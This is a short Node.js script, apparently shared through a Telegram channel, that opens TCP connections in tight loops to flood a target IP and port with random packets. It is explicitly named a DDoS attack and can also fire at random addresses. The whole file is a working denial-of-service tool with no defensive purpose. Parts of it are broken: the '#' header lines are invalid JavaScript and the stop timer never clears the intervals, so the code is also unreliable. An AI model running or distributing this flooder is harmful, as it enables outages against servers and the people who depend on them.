# Created By t.me/Lintar21
# Pls Don't Dalate The Author:)

const net = require('net');

function generateRandomIP() {
  const ip = [];
  for (let i = 0; i < 4; i++) {
    ip.push(Math.floor(Math.random() * 256));
  }
  return ip.join('.');
}

function generateRandomPort() {
  return Math.floor(Math.random() * 65536);
}

function generateRandomPacket(size) {
  const packet = [];
  for (let i = 0; i < size; i++) {
    packet.push(Math.floor(Math.random() * 256));
  }
  return Buffer.from(packet);
}

function sendDDoSPacket(ip, port, packet) {
  const client = new net.Socket();
  client.connect(port, ip, () => {
    client.write(packet);
    client.destroy();
  });
}

function startDDoSAttack(ip, port, time, packetSize, thread) {
  const startTime = Date.now();
  const endTime = startTime + time * 1000;

  for (let i = 0; i < thread; i++) {
    setInterval(() => {
      const targetIP = ip === 'random' ? generateRandomIP() : ip;
      const targetPort = port === 'random' ? generateRandomPort() : port;
      const targetPacket = generateRandomPacket(packetSize);

      sendDDoSPacket(targetIP, targetPort, targetPacket);

      if (Date.now() >= endTime) {
        clearInterval(this);
      }
    }, 0);
  }
}

const targetIP = process.argv[2];
const targetPort = parseInt(process.argv[3]);
const attackTime = parseInt(process.argv[4]);
const packetSize = parseInt(process.argv[5]);
const threadCount = parseInt(process.argv[6]);


startDDoSAttack(targetIP, targetPort, attackTime, packetSize, threadCount);